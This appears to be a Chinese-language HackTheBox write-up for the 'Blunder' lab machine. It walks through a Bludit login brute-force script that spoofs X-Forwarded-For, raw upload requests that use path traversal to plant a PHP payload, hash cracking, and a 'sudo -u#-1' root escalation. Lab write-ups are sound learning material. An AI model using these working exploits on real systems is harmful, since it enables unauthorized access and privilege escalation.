---
title: HackTheBox::Blunder
date: 2020-07-16
image: https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120180606.png
description: 
categories: 
- 渗透
tags:
- HackTheBox
- CVE
---


玩一手HTB

------

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120180614.png)

打开靶机就一些无关紧要的文字，dirsearch扫一下目录可以扫到登录后台，我们可以发现靶机使用了 `Bludit` cms

在看了一些Bludit的漏洞之后，发现在没有登录、我们又只有一个后台地址的情况下，弱口令比较靠谱

 

### [CVE-2019-17240](https://github.com/bludit/bludit/pull/1090)

Bludit是一套开源的轻量级博客内容管理系统（CMS）。



Bludit 3.9.2版本中的 `bl-kernel/security.class.php` 一些代码将检查主机进行的错误登录尝试次数。如果主机进行10次不正确的尝试，则会暂时阻止它们，以减轻暴力破解的企图。攻击者通过使用多个伪造的X-Forwarded-For或Client-IP HTTP标头利用该漏洞绕过保护机制。

爆破了半天，无果。

看了wp之后，我们找到了本来没有被dirsearch扫到的`/todo.txt`：

```
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```

可以猜到用户名可能是 `fergus` ，但是密码需要用到[cewl](https://www.jianshu.com/p/7906cc79fb9c)来生成弱口令字典

```
cewl -w wordlist.txt -d 10 -m 1 http://10.10.10.191/
```

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120180623.png)

然后我们利用改装过后的CVE-2019-17240的[poc](https://github.com/bludit/bludit/pull/1090)来打：

```
#!/usr/bin/env python3
import re
import requests
 
def open_ressources(file_path):
    return [item.replace("\n", "") for item in open(file_path).readlines()]
 
host = 'http://10.10.10.191'
login_url = host + '/admin/login'
username = 'fergus'
wordlist = open_ressources('wordlist.txt')
 
for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
 
    print('[*] Trying: {p}'.format(p = password))
 
    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }
 
    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }
 
    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
 
    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
```

 

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120180633.png)

最后在第一百多位爆破出用户名`fergus`密码`RolandDeschain`

进入后台。

 

### [CVE-2019-16113](https://github.com/bludit/bludit/issues/1081)

文章说的很详细，通过更改uuid的值来指定上传文件的位置，也就是目录穿越

然后不符合图片后缀的文件会先被移动到/bl-content/tmp/temp/目录下，然后进行删除，我们利用intruder进行条件竞争

上传.htaccess文件，把jpg解析为php：

```
POST /admin/ajax/upload-images HTTP/1.1
Host: 10.10.10.191
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.§191§/admin/edit-content/blender
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------1197595220477940257964308486
Content-Length: 560
Connection: close
Cookie: BLUDIT-KEY=k35lg8hngofh6kvif51i37m0o5
 
-----------------------------1197595220477940257964308486
Content-Disposition: form-data; name="images[]"; filename=".htaccess"
Content-Type: image/jpeg
 
RewriteEngine off
AddType application/x-httpd-php jpg
-----------------------------1197595220477940257964308486
Content-Disposition: form-data; name="uuid"
 
21b8a0e80e433cb7453e7d72382c6bc1
-----------------------------1197595220477940257964308486
Content-Disposition: form-data; name="tokenCSRF"
 
c623c868d292dec9b4e11c104f54c9e3dde971ee
-----------------------------1197595220477940257964308486--
```

 

上传恶意wh1sper.jpg到/bl-content/tmp/temp/目录：

```
POST /admin/ajax/upload-images HTTP/1.1
Host: 10.10.10.191
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.§191§/admin/edit-content/blender
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------1197595220477940257964308486
Content-Length: 589
Connection: close
Cookie: BLUDIT-KEY=k35lg8hngofh6kvif51i37m0o5
 
-----------------------------1197595220477940257964308486
Content-Disposition: form-data; name="images[]"; filename="wh1sper.jpg"
Content-Type: image/jpeg
 
<?php file_put_contetns("../wh1sper.php","<?php phpinfo();?>");?>
-----------------------------1197595220477940257964308486
Content-Disposition: form-data; name="uuid"
 
21b8a0e80e433cb7453e7d72382c6bc1/../../../tmp/temp
-----------------------------1197595220477940257964308486
Content-Disposition: form-data; name="tokenCSRF"
 
c623c868d292dec9b4e11c104f54c9e3dde971ee
-----------------------------1197595220477940257964308486--
```

 

获得shell：

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120180645.png)

 

拿到了shell之后根目录并没有我们想要的东西，我们这个账户并没有权限查看/root目录；

我们可以在www目录下看到另外一个版本的bludit，并且再user.php里面可以找到另外一个账户的账号密码

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120180653.png)

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120180703.png)

 

利用kali自带的 `hash-identifier` 进行识别：

```
root@wh1sper:~# hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: faca404fd5c0a31cf1897b823c695c85cffeb98d
 
Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))
```

 

 

https://md5decrypt.net/en/Sha1/解码得到:`Password120`

冰蝎终端：

```
su hugo
Password120
```

我们切换到了hugo用户，但是还是没有root权限

```
hugo@blunder:/var/www/bludit-3.9.2$ sudo -l
 
Password: Password120
 
Matching Defaults entries for hugo on blunder:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
User hugo may run the following commands on blunder:
(ALL, !root) /bin/bash
```

 

### [CVE-2019-14287](https://www.exploit-db.com/exploits/47502)

Google `(ALL, !root) /bin/bash` 之后可以用[这种方式](https://www.exploit-db.com/exploits/47502)提权：

```
hugo@blunder:/var/www/bludit-3.9.2$ sudo -u#-1 /bin/bash
 
root@blunder:/var/www/bludit-3.9.2# cat /root/root.txt
 
b1466707cf5be5f66b8be2c4a525e066
root@blunder:/var/www/bludit-3.9.2#
```

 

就可以得到root.txt了，另外home目录下还有个user.txt